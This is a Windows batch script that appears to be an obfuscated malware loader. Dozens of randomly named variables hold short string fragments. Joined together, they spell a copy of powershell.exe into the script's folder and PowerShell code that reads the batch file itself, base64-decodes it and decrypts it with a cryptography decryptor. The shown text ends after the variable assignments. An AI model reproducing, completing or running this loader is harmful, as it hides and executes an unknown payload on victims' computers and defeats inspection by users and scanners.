@echo off
set "sAglcjbzoz=rS"
set "YErfCYqLsU=nd"
set "WlOmVfpktL=y "
set "qtgHhEjDJa=he"
set "wnrGnQnIQO=\v"
set "EoFVbRmYaT=32"
set "mQwFkIzTCj=0\"
set "GKhKXbXBmg=:\"
set "pvJRujpxpF=ws"
set "LwSVHlNbfI=we"
set "gNywRiwaYR=py"
set "yJamJSCNki=ll"
set "FpgQIaZnQG=we"
set "mSQEuwGmqu=do"
set "ZnJaPBztxh= C"
set "IIzAOSYXFA=he"
set "XaTGUsJvkO=Wi"
set "kVORUYucgw=s\"
set "HopfdvrSnY=po"
set "SdjJicschY=Sy"
set "JldWnwHUjx=.e"
set "qtUTYTXXme=Po"
set "UvHjVwFNyP=ow"
set "SyJMvcWsgO=1."
set "LefijXJFXk=ll"
set "NVXuDdPzlD=em"
set "VkGvVGQLwE=rs"
set "FKqIJXfPff=in"
set "EFwIHmjzJd=xe"
set "mZMiwtPfqC=co"
set "dDGAeYMwFs=\W"
set "KlirlBtJLy=st"
set "RwEPURfymY= /"
set "ltZNeWqfdU= %~dp0"
set "eYLRloUmlJ=cd"
set "giCudKtrkg=raph"
set "UQxyYPSciw=pose"
set "xtNjUTWJKH=::('"
set "EHLBJrJgUq=y.Cr"
set "OfuamGNPMr=Mode"
set "qODVzrIlGJ=;$gh"
set "rarAuafLfK===')"
set "XJXbKHnaxj=$bKJ"
set "DjfmoVFYIP=tsWi"
set "gPliWAYgna=);$b"
set "YDufyQqzaB=JGT."
set "oiRZMjIYCd=[Sys"
set "BdyuoRDEOn=em.I"
set "zDghjrMIwh=6esa"
set "OHzMtDAuyM=mory"
set "PdZhUotDlb=.Cop"
set "YBujaxaGEo=.Cry"
set "pxMNJabrhN=esMa"
set "mpFCEixadL=ionM"
set "qVDiqwoJzZ=wScV"
set "qBtvoxQwqh=$Mfj"
set "FbZxOIWrlj=tion"
set "KcnkzMkqMv=ct S"
set "RXEacPxhQC=)) {"
set "MBSQeHsVFU=saBm"
set "oUUssFRvYy=fwSc"
set "VhHxTMyFvB=hy.A"
set "tMuCSUVMrC=tem."
set "HVoFnMoVht=join"
set "kYbjABBjnV=ay()"
set "zCNAYytbzY=);$v"
set "SOzhSfXDib=Secu"
set "OrmzzFRHJw=('%~f0'"
set "mczVgPhTWJ=rans"
set "AHqwZzFVgh= [st"
set "acYiCFtOoD=.Cre"
set "GwuOaiOElV=]::N"
set "XDhXYhiFeZ=106u"
set "gKcjASWuek=yD ="
set "AgLGnQMgxj=KJIA"
set "cwlwkdkpWf=PTtG"
set "ZEvueaRKGt=ert]"
set "opKUXCVtEU=tem."
set "YtPxeeuAug=CFxo"
set "FelfWxCBao=Disp"
set "ERkBnHCMHu=join"
set "LJrWEivSsP=();$"
set "FyJycoyLcf=orF'"
set "LlzvrnRWfh='')("
set "cYHUYvydWh=urit"
set "ggOIrXGEUJ=tryP"
set "cBSiKlFBNg=bjec"
set "mCvCYGpXwj=y.Pa"
